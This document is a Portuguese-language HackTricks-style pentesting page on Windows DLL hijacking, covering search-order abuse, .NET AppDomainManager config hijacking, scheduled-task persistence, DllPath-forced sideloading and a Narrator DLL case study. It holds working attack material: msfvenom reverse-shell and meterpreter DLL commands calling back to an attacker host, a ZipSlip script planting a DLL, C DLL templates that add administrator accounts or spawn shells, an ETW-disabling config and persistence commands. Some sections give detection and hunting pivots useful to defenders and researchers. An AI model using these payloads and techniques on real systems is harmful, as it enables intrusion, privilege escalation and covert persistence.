# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informações básicas

DLL Hijacking envolve manipular uma aplicação confiável para carregar uma DLL maliciosa. Esse termo engloba várias táticas, como **DLL Spoofing, Injection e Side-Loading**. É utilizado principalmente para execução de código, obtenção de persistência e, menos comumente, privilege escalation. Apesar do foco aqui ser a escalada de privilégios, o método de hijacking permanece consistente entre os diferentes objetivos.

### Técnicas comuns

Vários métodos são usados para DLL hijacking, e a eficácia de cada um depende da estratégia de carregamento de DLL da aplicação:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Substituir uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca anterior ao da DLL legítima, explorando o padrão de pesquisa da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para uma aplicação carregar, fazendo-a acreditar que se trata de uma DLL necessária inexistente.
4. **DLL Redirection**: Modificar parâmetros de pesquisa, como `%PATH%`, ou arquivos `.exe.manifest` / `.exe.local` para direcionar a aplicação à DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma equivalente maliciosa no diretório WinSxS, um método frequentemente associado a DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto da aplicação copiada, assemelhando-se às técnicas de Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

O DLL sideloading clássico não é a única forma de fazer um processo **.NET Framework** confiável carregar código do atacante. Se o executável alvo for uma aplicação **managed**, o CLR também consulta um arquivo de configuração da aplicação com o mesmo nome do executável (por exemplo, `Setup.exe.config`). Esse arquivo pode definir um **AppDomainManager** personalizado. Se a configuração apontar para uma assembly controlada pelo atacante e colocada ao lado do EXE, o CLR a carrega **antes do fluxo normal de código da aplicação** e a executa dentro do processo confiável.<sup>[[24]](#references)</sup>

De acordo com o schema de configuração do .NET Framework da Microsoft, tanto `<appDomainManagerAssembly>` quanto `<appDomainManagerType>` devem estar presentes para que o manager personalizado seja usado.<sup>[[16]](#references)[[17]](#references)</sup>

Configuração mínima:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gerenciador mínimo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas práticas:
- Este é um tradecraft específico do **.NET Framework**. Ele depende da análise da configuração do CLR, não da ordem de pesquisa de DLLs do Win32.
- O host precisa ser realmente um **EXE gerenciado**. Triagem rápida: `sigcheck -m target.exe`, `corflags target.exe` ou verifique o **CLR Runtime Header** nos metadados PE.
- O nome do arquivo de configuração precisa corresponder exatamente ao nome do executável (`<binary>.config`) e geralmente fica **ao lado do EXE**.
- Isso é útil com binários **assinados da Microsoft/de fornecedores**, porque o EXE confiável permanece intacto enquanto o assembly gerenciado malicioso é executado no processo.
- Se você já tiver um diretório de installer/update com permissão de escrita, o AppDomainManager hijacking pode ser usado como **first stage**, seguido de classic DLL sideloading ou reflective loading para os estágios posteriores.

### AppDomainManager como downloader + bootstrap de scheduled task

Um padrão prático de intrusão consiste em combinar o EXE gerenciado confiável com um `*.config` malicioso e uma DLL AppDomainManager maliciosa que atua apenas como um **small bootstrapper**:<sup>[[25]](#references)</sup>

1. O usuário inicia um installer ou updater .NET assinado a partir de um local plausível, como `%USERPROFILE%\Downloads`.
2. A configuração adjacente faz o CLR carregar o assembly do atacante **antes** do início da lógica legítima do aplicativo.
3. O manager malicioso executa um **path gate** (por exemplo, continua somente se o host EXE estiver sendo executado a partir de `Downloads` e permite que o second stage seja executado somente a partir de `%LOCALAPPDATA%`).
4. Se a verificação for aprovada, ele baixa o payload real para um caminho gravável pelo usuário, como `%LOCALAPPDATA%\PerfWatson2.exe`, e estabelece persistência com uma scheduled task.

Por que esta variante é importante:
- O host EXE assinado permanece inalterado, portanto uma triagem que calcula hash apenas do binário principal pode não detectar o comprometimento.
- **Path-based anti-analysis** simples é comum: mover o trio ZIP/EXE/DLL para Desktop, Temp ou um caminho de sandbox pode quebrar intencionalmente a cadeia.
- A DLL AppDomainManager do first stage pode permanecer pequena e gerar pouco ruído enquanto o implant real é obtido posteriormente.

Exemplo mínimo de persistência frequentemente observado com este padrão:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notas:
- ` /rl highest` significa **highest available** para esse usuário/sessão; isso, por si só, não garante uma escalada para SYSTEM.
- Essa técnica costuma ser categorizada melhor como **execução/persistência via abuso de configuração .NET** do que como um clássico hijacking de ordem de busca de DLLs ausente, embora os operadores frequentemente encadeiem as duas técnicas.

Pivôs de detecção:
- Executáveis .NET assinados iniciados a partir de **caminhos de extração de ZIP**, `Downloads`, `%TEMP%` ou outras pastas graváveis pelo usuário, com um `<exe>.config` **colocalizado**.
- Novas tarefas agendadas cuja ação aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads` e cujos nomes imitam atualizadores de navegadores/fornecedores.
- Processos bootstrap gerenciados de curta duração que baixam imediatamente outro EXE e, em seguida, iniciam `schtasks.exe`.
- Samples que encerram cedo, a menos que o caminho do executável corresponda a um diretório esperado no perfil do usuário.

### Hijacking de uma tarefa agendada existente para relançar a cadeia de sideload

Para persistência, não procure apenas por **criação de uma nova tarefa**. Alguns conjuntos de intrusão esperam até que um instalador legítimo crie uma **tarefa normal de atualização** e, então, **reescrevem a ação da tarefa** para que o nome, o autor e o gatilho existentes continuem familiares aos defensores.

Fluxo de trabalho reutilizável:
1. Instale/inicie o software legítimo e identifique a tarefa que ele normalmente cria.
2. Exporte o XML da tarefa e anote os valores atuais de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Substitua apenas a ação para que a tarefa inicie seu **EXE host confiável** a partir de um diretório de staging gravável pelo usuário, que então faça sideload ou carregue o payload real via AppDomain.
4. Registre novamente o mesmo nome de tarefa em vez de criar um novo artefato óbvio de persistência.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por que é mais furtivo:
- O nome da tarefa ainda pode parecer legítimo (por exemplo, um atualizador de fornecedor).
- O serviço **Task Scheduler** a inicia, portanto a validação do processo pai/ancestral geralmente vê a cadeia de agendamento esperada em vez de `explorer.exe`.
- Equipes de DFIR que procuram apenas **novos nomes de tarefas** podem não perceber uma tarefa cujo registro já existia, mas cuja ação agora aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou outro caminho controlado pelo atacante.

Pivôs rápidos para hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare o XML de `C:\Windows\System32\Tasks\*` e os metadados de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` com uma baseline.
- Gere um alerta quando uma **tarefa de atualização com aparência de fornecedor** for executada a partir de **diretórios graváveis pelo usuário** ou iniciar um EXE .NET com um arquivo `*.config` no mesmo diretório.

> [!TIP]
> Para uma cadeia passo a passo que combina HTML staging, configurações AES-CTR e implants .NET sobre DLL sideloading, revise o workflow abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrando Dlls ausentes

A maneira mais comum de encontrar Dlls ausentes em um sistema é executar o [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **2 filtros a seguir**:

![Técnicas comuns - Encontrando Dlls ausentes: A maneira mais comum de encontrar Dlls ausentes em um sistema é executar o procmon do sysinternals, configurando os 2 filtros a seguir](<../../../images/image (961).png>)

![Técnicas comuns - Encontrando Dlls ausentes: A maneira mais comum de encontrar Dlls ausentes em um sistema é executar o procmon do sysinternals, configurando os 2 filtros a seguir](<../../../images/image (230).png>)

e mostrar apenas a **File System Activity**:

![Técnicas comuns - Encontrando Dlls ausentes: e mostrar apenas a File System Activity](<../../../images/image (153).png>)

Se você estiver procurando por **dlls ausentes em geral**, **deixe** isso em execução por alguns **segundos**.\
Se você estiver procurando por uma **DLL ausente dentro de um executável específico**, defina outro filtro, como **"Process Name" "contains" `<exec name>`**, execute-o e pare de capturar eventos.<sup>[[9]](#references)</sup>

## Explorando Dlls ausentes

Para escalar privilégios, procure uma **DLL que um processo privilegiado tente carregar** a partir de um local no qual você possa escrever. Isso pode acontecer quando você controla um diretório pesquisado antes do diretório que contém a DLL legítima ou quando a DLL solicitada não existe e você pode escrever em um dos diretórios pesquisados.

### Ordem de pesquisa de Dll

**Na** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching), **você pode ver como as Dlls são carregadas especificamente.**

**Aplicações Windows** procuram DLLs seguindo um conjunto de **caminhos de pesquisa predefinidos**, obedecendo a uma sequência específica. O problema do DLL hijacking surge quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, garantindo que seja carregada antes da DLL autêntica. Uma solução para evitar isso é garantir que a aplicação use caminhos absolutos ao referenciar as DLLs necessárias.

Você pode ver abaixo a **ordem de pesquisa de DLL em sistemas de 32 bits**:

1. O diretório a partir do qual a aplicação foi carregada.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho desse diretório.(_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não existe uma função que obtenha o caminho desse diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho desse diretório.
1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Observe que isso não inclui o caminho por aplicação especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de pesquisa de DLL.

Essa é a ordem de pesquisa **padrão**, com **SafeDllSearchMode** habilitado. Quando está desabilitado, o diretório atual sobe para a segunda posição. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a pesquisa começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Por fim, uma DLL pode ser carregada por caminho absoluto em vez de pelo nome. Nesse caso, o Windows procura a própria DLL apenas nesse caminho; as dependências solicitadas pelo nome ainda seguem a ordem de pesquisa aplicável.

Existem outras maneiras de alterar a ordem de pesquisa, mas não vou explicá-las aqui.

### Encadeando uma escrita arbitrária de arquivo em um hijack de DLL ausente

1. Use filtros do **ProcMon** (`Process Name` = EXE alvo, `Path` termina com `.dll`, `Result` = `NAME NOT FOUND`) para coletar os nomes das DLLs que o processo procura, mas não consegue encontrar.<sup>[[14]](#references)</sup>
2. Se o binário for executado por um **schedule/service**, colocar uma DLL com um desses nomes no **diretório da aplicação** (entrada nº 1 da ordem de pesquisa) fará com que ela seja carregada na próxima execução. Em um caso envolvendo um scanner .NET, o processo procurava `hostfxr.dll` em `C:\samples\app\` antes de carregar a cópia real de `C:\Program Files\dotnet\fxr\...`.
3. Crie uma DLL de payload (por exemplo, um reverse shell) com qualquer export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se sua primitive for uma **escrita arbitrária no estilo ZipSlip**, crie um ZIP cuja entrada escape do diretório de extração para que a DLL seja colocada na pasta da aplicação:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entregue o arquivo ao inbox/share monitorado; quando a scheduled task iniciar o processo novamente, ele carregará a DLL maliciosa e executará seu código como a service account.

### Forçando o sideloading por meio de RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar deterministicamente o caminho de pesquisa de DLL de um processo recém-criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo com as APIs nativas do ntdll. Ao fornecer aqui um diretório controlado pelo atacante, um processo-alvo que resolva uma DLL importada pelo nome (sem caminho absoluto e sem usar as flags de carregamento seguro) poderá ser forçado a carregar uma DLL maliciosa desse diretório.

Ideia principal
- Crie os parâmetros do processo com RtlCreateProcessParametersEx e forneça um DllPath personalizado que aponte para sua pasta controlada (por exemplo, o diretório onde seu dropper/unpacker está localizado).
- Crie o processo com RtlCreateUserProcess. Quando o binário-alvo resolver uma DLL pelo nome, o loader consultará o DllPath fornecido durante a resolução, permitindo um sideloading confiável mesmo quando a DLL maliciosa não estiver no mesmo diretório que o EXE-alvo.

Observações/limitações
- Isso afeta o processo filho que está sendo criado; é diferente de SetDllDirectory, que afeta apenas o processo atual.
- O alvo deve importar ou executar LoadLibrary para uma DLL pelo nome (sem caminho absoluto e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e caminhos absolutos definidos diretamente no código não podem ser hijacked. Exportações encaminhadas e SxS podem alterar a precedência.

Exemplo mínimo em C (ntdll, strings wide, tratamento de erros simplificado):

<details>
<summary>Exemplo completo em C: forçando o sideloading de DLL por meio de RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque um xmllite.dll malicioso (exportando as funções necessárias ou fazendo proxy para o original) no seu diretório DllPath.
- Inicie um binário assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve a importação por meio do DllPath fornecido e faz o sideload da sua DLL.

Essa técnica foi observada in-the-wild sendo usada para conduzir cadeias de sideloading em múltiplos estágios: um launcher inicial solta uma DLL auxiliar, que então inicia um binário assinado pela Microsoft e vulnerável a hijacking, com um DllPath personalizado para forçar o carregamento da DLL do atacante a partir de um diretório de staging.<sup>[[6]](#references)</sup>


### Hijacking de AppDomainManager do .NET via `.exe.config`

Para alvos **.NET Framework**, o sideloading pode ser feito **antes de `Main()`** sem aplicar patch na memória, explorando o arquivo **`.exe.config`** adjacente da aplicação. Em vez de depender apenas da ordem de pesquisa de DLLs do Win32, o atacante coloca um EXE legítimo do .NET junto a uma config maliciosa e a um ou mais assemblies controlados pelo atacante.

Como a cadeia funciona:<sup>[[15]](#references)[[22]](#references)</sup>
1. O EXE host é iniciado e o **CLR lê `<exe>.config`**.
2. A config define **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, fazendo com que o runtime instancie um `AppDomainManager` controlado pelo atacante.
3. O manager malicioso obtém **execução pré-`Main()`** dentro do processo host confiável.
4. A mesma config pode forçar o CLR a resolver assemblies locais primeiro (por exemplo, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e pode enfraquecer a validação/telemetria do runtime sem aplicar patch inline.

Padrão no estilo de campanhas (o aninhamento exato pode variar conforme a diretiva / versão do CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Por que isso é útil:
- **`<probing privatePath="."/>`** mantém a resolução de assemblies no diretório da aplicação, transformando a pasta em uma superfície previsível de sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** transferem a execução para o código do atacante durante a inicialização do CLR, antes que a lógica legítima da aplicação seja executada.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** pode permitir que uma aplicação full-trust carregue assemblies não assinados ou adulterados sem uma falha de validação de strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita redirecionamentos de publisher policy para assemblies mais recentes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** torna a seleção do runtime mais determinística.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** é especialmente interessante porque o **CLR desabilita sua própria visibilidade via ETW** a partir da configuração, em vez de o implant modificar `EtwEventWrite` na memória.

Padrão operacional observado em campanhas recentes:
- A Etapa 1 deposita `setup.exe`, `setup.exe.config` e assemblies locais.
- A Etapa 2 os copia para uma pasta verossímil de **atualização em AppData**, renomeia o host para algo como `update.exe` e o executa novamente por meio de uma **scheduled task**.
- A Etapa 3 verifica o contexto de execução (por exemplo, o processo pai esperado `svchost.exe` do Task Scheduler) antes de carregar a DLL/export final do RAT.

Ideias para hunting:
- **Executáveis .NET** assinados ou de outra forma legítimos sendo executados com arquivos **`.config`** adjacentes suspeitos em locais graváveis pelo usuário.
- Arquivos `.config` contendo **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ou **`etwEnable enabled="false"`**.
- Scheduled tasks que executam novamente binários de atualização renomeados a partir de **`%LOCALAPPDATA%`** ou de diretórios específicos de aplicações `\bin\update\`.
- Cadeias de processos pai/filho nas quais uma scheduled task inicia um host .NET confiável que imediatamente carrega assemblies que não são do fornecedor a partir de seu próprio diretório.

#### Exceções à ordem de busca de DLLs na documentação do Windows

Algumas exceções à ordem padrão de busca de DLLs são observadas na documentação do Windows:

- Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca usual. Em vez disso, ele verifica redirecionamento e um manifest antes de usar como padrão a DLL já carregada na memória. **Nesse cenário, o sistema não realiza uma busca pela DLL**.
- Nos casos em que a DLL é reconhecida como uma **DLL conhecida** para a versão atual do Windows, o sistema utilizará sua versão da DLL conhecida, juntamente com quaisquer DLLs dependentes, **omitindo o processo de busca**. A chave do registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas DLLs conhecidas.
- Caso uma **DLL tenha dependências**, a busca por essas DLLs dependentes é realizada como se elas fossem indicadas apenas por seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada por meio de um caminho completo.

### Escalando Privilégios

**Requisitos**:

- Identifique um processo que opere ou vá operar com **privilégios diferentes** (movimentação horizontal ou lateral) e ao qual falte uma DLL.
- Certifique-se de que haja **acesso de escrita** disponível para qualquer **diretório** no qual a **DLL** será **procurada**. Esse local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.

Esses pré-requisitos não são comuns por padrão: executáveis privilegiados normalmente não têm dependências de DLL ausentes, e usuários padrão normalmente não podem gravar em diretórios do caminho de busca do sistema. Ambientes configurados incorretamente ainda podem expor ambas as condições.\
Se os requisitos forem atendidos, verifique o projeto [UACME](https://github.com/hfiref0x/UACME). Embora seu objetivo principal seja o bypass de UAC, ele contém PoCs de DLL hijacking para versões específicas do Windows que muitas vezes podem ser adaptadas ao diretório gravável encontrado.

Observe que você pode **verificar suas permissões em uma pasta** executando:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar as imports de um executável e as exports de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para obter um guia completo sobre como **abusar de Dll Hijacking para escalar privilégios** com permissões de escrita em uma **pasta do System Path**, consulte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificará se você tem permissões de escrita em alguma pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **funções do PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma dll que exporte pelo menos todas as funções que o executável importará dela**. De qualquer forma, observe que Dll Hijacking é útil para [escalar do nível de Integridade Média para Alta **(contornando o UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de [**Integridade Alta para SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** neste estudo sobre dll hijacking, focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção**, você encontrará alguns **códigos básicos de dll** que podem ser úteis como **templates** ou para criar uma **dll com funções não necessárias exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxifying**

Basicamente, um **Dll proxy** é uma Dll capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** conforme o **esperado**, **repassando todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), você pode **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma dll proxificada**, ou **indicar a Dll** e **gerar uma dll proxificada**.

### **Meterpreter**

**Obter uma rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Sua própria

Em muitos casos, a DLL que você compila deve **exportar todas as funções importadas pelo processo vítima**. Se uma exportação necessária estiver ausente, o binário não poderá resolvê-la e o exploit falhará.

<details>
<summary>Modelo de DLL em C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL em C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa com entrada de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de caso: Hijack da DLL de localização TTS do Narrator OneCore (Accessibility/ATs)

O Windows Narrator.exe ainda procura, na inicialização, uma DLL de localização previsível e específica do idioma, que pode ser alvo de hijack para execução arbitrária de código e persistência.<sup>[[7]](#references)</sup>

Fatos principais
- Caminho de procura (builds atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (builds antigos): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se existir uma DLL controlada pelo atacante e com permissão de escrita no caminho OneCore, ela será carregada e `DllMain(DLL_PROCESS_ATTACH)` será executada. Nenhuma exportação é necessária.

Descoberta com Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` ou `CreateFile`.
- Inicie o Narrator e observe o carregamento tentado do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Um hijack ingênuo exibirá/destacará a interface. Para permanecer silencioso, ao anexar, enumere as threads do Narrator, abra a thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) e use `SuspendThread` nela; continue na sua própria thread. Consulte o PoC para ver o código completo.<sup>[[8]](#references)</sup>

Trigger e persistência via configuração de Accessibility
- Contexto do usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
